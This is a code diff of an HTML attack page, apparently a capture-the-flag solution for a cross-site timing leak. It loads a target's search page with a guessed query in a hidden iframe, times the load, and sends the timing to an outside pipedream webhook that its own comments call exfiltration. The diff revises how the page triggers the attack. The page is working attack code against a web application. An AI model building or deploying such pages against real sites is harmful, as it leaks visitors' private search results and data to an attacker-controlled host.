@@ -1,50 +1,56 @@
 <html>
     <head>
         <script>
-            fetch("https://eo92jpwn05w7j5i.m.pipedream.net");
-            // This function runs after the iframe loads and sends timing stats
-            function runTest() {
-                // Wait for the iframe to load (~500ms)
-                setTimeout(() => {
-                    // URL to load for the flag
-                    var url_to_load = 'http://125.138.133.213:44444/search?query=S';
+            document.addEventListener("DOMContentLoaded", function() {
+                // This function runs after the iframe loads and sends timing stats
+                function runTest() {
+                    // Wait for the iframe to load (~500ms)
+                    setTimeout(() => {
+                        // URL to load for the flag
+                        var url_to_load = 'http://125.138.133.213:44444/search?query=S';
 
-                    // Webhook URL to report (exfiltration)
-                    var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
+                        // Webhook URL to report (exfiltration)
+                        var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
 
-                    var start = window.performance.now();
+                        var start = window.performance.now();
 
-                    // Create an iframe element for the search query page
-                    var iframe = document.createElement('iframe');
-                    iframe.style.display = 'none'; // Hide the iframe
-                    iframe.src = url_to_load; // Set the src to the search page
-                    document.body.appendChild(iframe);
+                        // Create an iframe element for the search query page
+                        var iframe = document.createElement('iframe');
+                        iframe.style.display = 'none'; // Hide the iframe
+                        iframe.src = url_to_load; // Set the src to the search page
+                        document.body.appendChild(iframe);
 
-                    // Listen for the iframe load event
-                    iframe.onload = function() {
-                        var end = window.performance.now();
-                        var timing = end - start;
+                        // Listen for the iframe load event
+                        iframe.onload = function() {
+                            var end = window.performance.now();
+                            var timing = end - start;
 
-                        // Exfiltrate the load time for the iframe page
-                        fetch(wh_url + '/NO?status=200&time=' + timing);
+                            // Exfiltrate the load time for the iframe page
+                            fetch(wh_url + '/NO?status=200&time=' + timing);
 
-                        // Optionally, you can remove the iframe after it's loaded
-                        iframe.remove();
-                    };
-                }, 500);
-            }
+                            // Optionally, you can remove the iframe after it's loaded
+                            iframe.remove();
+                        };
+                    }, 500);
+                }
 
-            // Create and append the image element for the 1.jpg image
-            var img = document.createElement('img');
-            img.style.display = 'block';  // Hide the image
-            img.src = 'http://125.138.133.213:44444/static/images/1.jpg';  // Image URL
-            document.body.appendChild(img);  // Append the image to the body
+                // Create and append the image element for the 1.jpg image
+                var img = document.createElement('img');
+                img.style.display = 'block';  // Ensure the image is displayed
+                img.src = 'https://125.138.133.213:44444/static/images/1.jpg';  // Image URL (HTTPS)
 
-            // Run the test function with the desired query string
-            runTest();
+                // Once the image is loaded, run the test function
+                img.onload = function() {
+                    // Now that the image is loaded, execute runTest
+                    runTest();
+                };
+
+                // Append the image to the body
+                document.body.appendChild(img);  // Append the image to the body
+            });
         </script>
     </head>
     <body>
-        <!-- The page content here -->ㅗㅑㅅd
+        <!-- The page content here -->ㅇㅇ
     </body>
 </html>
